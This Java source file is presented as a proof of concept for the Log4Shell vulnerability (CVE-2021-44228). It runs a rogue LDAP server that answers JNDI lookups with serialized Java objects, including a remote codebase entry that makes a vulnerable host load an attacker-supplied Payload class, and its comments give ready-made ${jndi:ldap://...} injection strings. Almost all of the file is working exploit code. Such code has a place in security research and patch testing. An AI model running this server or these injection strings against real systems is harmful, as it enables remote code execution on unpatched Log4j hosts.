package ldap;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.InetAddress;
import java.util.logging.ConsoleHandler;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import payload.Payload;

/**
 * This is a proof of concept implementation of CVE-2021-44228 (https://github.com/advisories/GHSA-jfh8-c2jp-5v3q)
 */
public class LdapServer {

	public static void main(String... args) throws Exception {
		final var port = 1389;

		try {
			final var config = new InMemoryDirectoryServerConfig("dc=exploit,dc=com");

			config.setListenerConfigs(new InMemoryListenerConfig("exploit", InetAddress.getByName("0.0.0.0"), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault()));
			config.addInMemoryOperationInterceptor(new OperationInterceptor());
			config.setAccessLogHandler(new ConsoleHandler());

			final var server = new InMemoryDirectoryServer(config);

			System.out.println("Start server");

			server.startListening();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	private static final class OperationInterceptor extends InMemoryOperationInterceptor {

		@Override public void processSearchResult(InMemoryInterceptedSearchResult result) {
			try {
				final var baseDn = result.getRequest().getBaseDN();

				System.out.println("Process search result for " + baseDn);

				if (baseDn.equals("exe")) {
					sendExeResult(result, new Entry(baseDn));
				} else {
					sendSerializedResult(result, new Entry(baseDn));
				}
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}

		// Works only if the system property com.sun.jndi.ldap.object.trustURLCodebase is true
		// ${jndi:ldap://127.0.0.1/exe}
		private void sendExeResult(InMemoryInterceptedSearchResult result, Entry entry) throws LDAPException, IOException, ClassNotFoundException {
			final var send = new Payload();
			final var location = LdapServer.class.getResource("").toString();

			final var serializedStream = new ByteArrayOutputStream();
			final var objectStream = new ObjectOutputStream(serializedStream);
			objectStream.writeObject(send);
			serializedStream.flush();

			entry.addAttribute("javaClassName", send.getClass().getName());
			entry.addAttribute("javaCodebase", location);
			entry.addAttribute("javaSerializedData", serializedStream.toByteArray());

			result.sendSearchEntry(entry);
			result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
		}

		// Works all the time
		// ${jndi:ldap://127.0.0.1/a}
		private void sendSerializedResult(InMemoryInterceptedSearchResult result, Entry entry) throws LDAPException, IOException {
			final var send = "THIS IS SEND TO THE LOG!!! LOG4J EXPLOIT!";

			final var serializedStream = new ByteArrayOutputStream();
			final var objectStream = new ObjectOutputStream(serializedStream);
			objectStream.writeObject(send);
			serializedStream.flush();

			entry.addAttribute("javaClassName", send.getClass().getName());
			entry.addAttribute("javaSerializedData", serializedStream.toByteArray());

			result.sendSearchEntry(entry);
			result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
		}
	}
}
